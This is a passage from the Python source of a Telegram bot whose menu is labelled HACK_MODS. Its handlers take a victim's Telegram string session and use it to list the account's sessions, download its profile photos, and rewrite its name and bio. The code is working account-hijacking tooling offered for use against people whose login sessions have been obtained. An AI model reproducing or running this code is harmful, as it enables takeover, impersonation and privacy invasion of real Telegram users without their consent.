    
    if len(result) > 3855:
        with open("sessions.txt", "w") as f:
            f.write(result)
        await client.send_document(chat_id, "sessions.txt")
        os.remove("sessions.txt")
    else:
        await query.message.reply_text(
            text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS
        )


# Feature O - Download Profile Photos
@app.on_callback_query(filters.regex("^O$"))
async def feature_o(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    result = await download_profile_pics(session.text)
    
    if result and isinstance(result, str) and os.path.exists(result):
        await client.send_photo(chat_id, result, caption="**✅ ᴘʀᴏғɪʟᴇ ᴘʜᴏᴛᴏ ᴅᴏᴡɴʟᴏᴀᴅᴇᴅ!**")
        os.remove(result)
    else:
        await query.message.reply_text(
            text="**ɴᴏ ᴘʀᴏғɪʟᴇ ᴘʜᴏᴛᴏ ғᴏᴜɴᴅ!**\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
            reply_markup=HACK_MODS
        )


# Feature P - Change Profile
@app.on_callback_query(filters.regex("^P$"))
async def feature_p(client, query):
    chat_id = query.message.chat.id
    session = await client.ask(chat_id, "**ɴᴏᴡ ɢɪᴠᴇ ᴍᴇ ᴛʜᴇ sᴛʀɪɴɢ sᴇssɪᴏɴ:**")
    fname = await client.ask(chat_id, "**ɢɪᴠᴇ ᴍᴇ ɴᴇᴡ ғɪʀsᴛ ɴᴀᴍᴇ (sᴇɴᴅ '.' ᴛᴏ sᴋɪᴘ):**")
    lname = await client.ask(chat_id, "**ɢɪᴠᴇ ᴍᴇ ɴᴇᴡ ʟᴀsᴛ ɴᴀᴍᴇ (sᴇɴᴅ '.' ᴛᴏ sᴋɪᴘ):**")
    bio = await client.ask(chat_id, "**ɢɪᴠᴇ ᴍᴇ ɴᴇᴡ ʙɪᴏ (sᴇɴᴅ '.' ᴛᴏ sᴋɪᴘ):**")
    
    fn = None if fname.text == "." else fname.text
    ln = None if lname.text == "." else lname.text
    bi = None if bio.text == "." else bio.text
    
    result = await change_profile(session.text, fn, ln, bi)
    await query.message.reply_text(
        text=result + "\n\n**ᴛʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᴍᴇ**",
        reply_markup=HACK_MODS
    )


# ==================== MAIN ====================
if __name__ == "__main__":
    logger.info("🚀 Bot Starting...")
    logger.info(f"💞 Created by {OWNER_NAME}")
    
    async def main():
        await app.start()
        logger.info("✅ Bot Started Successfully!")
        await idle()
        await app.stop()
        logger.info("🛑 Bot Stopped!")
    
    app.run(main())
